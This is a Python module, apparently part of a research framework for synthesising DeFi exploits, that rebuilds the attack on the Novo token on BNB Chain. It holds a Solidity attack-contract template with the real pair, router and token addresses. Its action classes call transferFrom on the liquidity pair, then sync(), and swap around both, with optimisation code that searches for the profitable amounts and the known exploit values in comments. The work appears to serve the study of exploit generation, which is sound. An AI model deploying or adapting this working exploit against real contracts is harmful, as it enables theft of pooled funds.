import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict

from Actions.Utils import *
from Actions.UtilsPrecision import *

class NovoAction():
    initialStates = [120090152, 39500, 120090152, 39500]
    globalStates = initialStates.copy()
    # globalStates[0]: PancakePair Reserve Novo
    # globalStates[1]: PancakePair Reserve WBNB
    # globalStates[2]: PancakePair Balance Novo
    # globalStates[3]: PancakePair Balance Novo

    startStr_contract = '''// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/NovoI.sol";

// Exploit Alert ref: https://www.panewslab.com/zh_hk/articledetails/f40t9xb4.html
// Origin Attack Transaction: 0xc346adf14e5082e6df5aeae650f3d7f606d7e08247c2b856510766b4dfcdc57f
// Blocksec Txinfo: https://versatile.blocksecteam.com/tx/bsc/0xc346adf14e5082e6df5aeae650f3d7f606d7e08247c2b856510766b4dfcdc57f

// Attack Addr: 0x31a7cc04987520cefacd46f734943a105b29186e
// Attack Contract: 0x3463a663de4ccc59c8b21190f81027096f18cf2a

// Vulnerable Contract: https://bscscan.com/address/0xa0787daad6062349f63b7c228cbfd5d8a3db08f1#code


contract Novo_attack {
    // IPancakePair PancakePair = IPancakePair(0xEeBc161437FA948AAb99383142564160c92D2974);
    IPancakePair PancakePair = IPancakePair(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D);
    IPancakeRouter PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    INOVO novo = INOVO(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333);
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str89 = "";
    string str90 = "";
    address[] path;

    constructor() payable {
        require(msg.value == 20 * 10 ** 18, "loan amount does not match");
        wbnb.deposit{value: 20 * 10 ** 18}();
        path = new address[](2);
        wbnb.approve(address(PancakeRouter), type(uint256).max);
        novo.approve(address(PancakePair), novo.balanceOf(address(this)));
    }
    receive() external payable {}
    '''

    startStr_attack = '''    function attack( $$_$$ ) public {
        // ===================== Flashloan of 20 BNB ==================  
'''

    endStr_attack = '''        revert(ProfitSummary());
    }
    '''

    endStr_contract = '''
    function PancakePairBalanceSummary() internal returns (string memory) {
        uint balance0 = novo.balanceOf(address(PancakePair));
        uint balance1 = wbnb.balanceOf(address(PancakePair));
        str89 = append("NOVO balance: ", uint2str(balance0 / 1e9));
        str90 = append(" WBNB balance: ", uint2str(balance1 / 1e16));
        return append(str89, str90);
    }

    function PancakePairReserveSummary() internal returns (string memory) {
        (uint112 reserve0, uint112 reserve1,) = PancakePair.getReserves();
        str89 = append("NOVO reserve: ", uint2str(reserve0 / 1e9));
        str90 = append(" WBNB reserve: ", uint2str(reserve1 / 1e16));
        return append(str89, str90);
    }
        
    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = wbnb.balanceOf(address(this)) / 10 ** 16;
        return append("WBNB balance: ", uint2str(balance1));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}

                
    '''

    initialBalances = {"WBNB": 2000}
    currentBalances = initialBalances.copy()
    TargetTokens = {'WBNB'}
    TokenPrices = {"WBNB": 1.0}

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 1:
            return 0
        profit = stats[0] - 2000
        #        WBNB
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)

    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)

    def initialPass():
        action1 = SwapFeeWBNB2NOVO
        action2 = TransferFrom
        action3 = PancakePairSync
        action4 = SwapFeeNovo2WBNB

        action_list_1 = [action1, action4]

        action1_prestate_dependency = [action2, action3, action4]
        action4_prestate_dependency = [action1, action2, action3]

        # # seq of actions
        ActionWrapper = NovoAction
        action_lists = [action1_prestate_dependency + [action1],
                        action4_prestate_dependency + [action4]]

        start = time.time()
        initialPassCollectData(action_lists, ActionWrapper)
        ShowDataPointsForEachAction(action_list_1)
        end = time.time()
        print("in total it takes %f seconds" % (end - start))

    def runinitialPass():
        return
   


class SwapFeeWBNB2NOVO(NovoAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    # Action Specific Variables
    numInputs = 1
    tokensIn = ['WBNB']
    tokensOut = ['Novo']
    range = [0, 2000]   # 1720

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''       path[0] = address(wbnb);
        path[1] = address(novo);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens($$ * 1e16, 1, path, address(this), block.timestamp);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = PancakePairReserveSummary();
        uint NovoGot = novo.balanceOf(address(this));

        path[0] = address(wbnb);
        path[1] = address(novo);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens($$ * 1e16, 1, path, address(this), block.timestamp);
                
        NovoGot = (novo.balanceOf(address(this)) - NovoGot ) / 1e9;
        str2 = PancakePairReserveSummary();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(NovoGot)) ));

'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0)  # NOVO reserve
        cls.values[1].append(v1)  # WBNB reserve
        cls.values[2].append(v2)  # NovoGot
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])

        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['WBNB'] -= input
        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[2] = output0

        cls.globalStates[1] = output1
        cls.globalStates[3] = output1

        if "Novo" not in cls.currentBalances:
            cls.currentBalances["Novo"] = output2
        else:
            cls.currentBalances["Novo"] += output2
        return

    @classmethod
    def string(cls):
        return cls.__name__


class TransferFrom(NovoAction):
    # Action Specific Variables
    numInputs = 1
    tokensIn = []
    tokensOut = []
    range = [0, 150000000]   # 113951614

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''       novo.transferFrom(address(PancakePair), address(novo), $$ * 1e9);\n'''
        return action


    @classmethod
    def transit(cls, input):  # Assume input is a value
        cls.globalStates[2] = cls.globalStates[2] - input

    @classmethod
    def string(cls):
        return cls.__name__

    @classmethod
    def constraint(cls, input):
        return cls.globalStates[2] - input


class PancakePairSync(NovoAction):
    numInputs = 0
    tokensIn = []
    tokensOut = []
    range = []

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        PancakePair.sync();  \n'''
        return action


    @classmethod
    def transit(cls):  # Assume input is a value
        cls.globalStates[0] = cls.globalStates[2]
        cls.globalStates[1] = cls.globalStates[3]

    @classmethod
    def string(cls):
        return cls.__name__


class SwapFeeNovo2WBNB(NovoAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ['Novo']
    tokensOut = ['WBNB']
    range = [0, 8000000]  # 4749070

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        path[0] = address(novo);
        path[1] = address(wbnb);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens($$ * 1e9, 1, path, address(this), block.timestamp);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = PancakePairReserveSummary();
        uint WBNBGot = wbnb.balanceOf(address(this));

        path[0] = address(novo);
        path[1] = address(wbnb);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens($$ * 1e9, 1, path, address(this), block.timestamp);
       
        str2 = PancakePairReserveSummary();
        WBNBGot = (wbnb.balanceOf(address(this)) - WBNBGot ) / 1e16; 
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(WBNBGot)) ));

'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]

        if point in cls.points:
            return -2

        # if values[4] == 0:  # zero values will cause shgo crash
        #     return -2

        cls.points.append(point)

        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0)  # NOVO reserve
        cls.values[1].append(v1)  # WBNB reserve
        cls.values[2].append(v2)  # WBNBOut

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        output0 = None
        output1 = None
        output2 = None

        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[2] = output0

        cls.globalStates[1] = output1
        cls.globalStates[3] = output1

        cls.currentBalances["WBNB"] += output2

        return

    @classmethod
    def string(cls):
        return cls.__name__


def main():

    # config.method
    # config.contract_name
    # config.initialEther
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 0
    config.ETHorBSCorDVDorFantom = 1
    config.initialEther = 20
    config.blockNum = 18225002
    config.contract_name = "Novo_attack"


# Test for initial pass of data collecton:
    NovoAction.initialPass()
    # NovoAction.runinitialPass()

    # action1 = SwapFeeWBNB2NOVO
    # action2 = TransferFrom
    # action3 = PancakePairSync
    # action4 = SwapFeeNovo2WBNB


    # action_list = [action1, action2, action3, action4]
    # initial_guess = [1720, 113951614, 4749070]

    # ActionWrapper = NovoAction

    # # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    # actual_profit = 24857
    # print("actual profit: ", actual_profit)
    # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # return actual_profit, e1, e2, e3, e4



if __name__ == "__main__":
    main()
    